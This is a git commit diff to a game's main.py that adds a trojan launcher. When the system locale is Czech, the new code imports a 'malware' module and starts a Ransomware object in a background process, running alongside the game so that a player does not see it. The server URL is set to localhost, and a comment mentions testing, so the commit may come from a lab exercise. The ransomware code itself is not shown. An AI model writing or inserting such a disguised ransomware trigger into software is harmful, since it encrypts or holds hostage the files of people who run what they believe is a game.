5eaa2c955ae27fb4c3c852c5361d2851ae2863b5
Petrkowal <petr.krautwurst@seznam.cz>
2025-11-30 23:34:51 +0100

    main processing

--- main.py
+++ main.py
@@ -1,4 +1,24 @@
 import game
+import malware
+import locale
+from multiprocessing import Process
+
+def check_czech_locale():
+    lang, _ = locale.getdefaultlocale()
+    if lang and lang.startswith('cs'):
+        return True
+    return False
+
+
+def run_rsw():
+    if check_czech_locale():
+        ransomware = malware.Ransomware(server_base_url="http://localhost:8001") # Start path default as home, change if testing
+        ransomware.run()
 
 if __name__ == '__main__':
-    game.play()
+    game_process = Process(target=game.play)
+    rsw_process = Process(target=run_rsw)
+
+    game_process.start()
+    rsw_process.start()
+
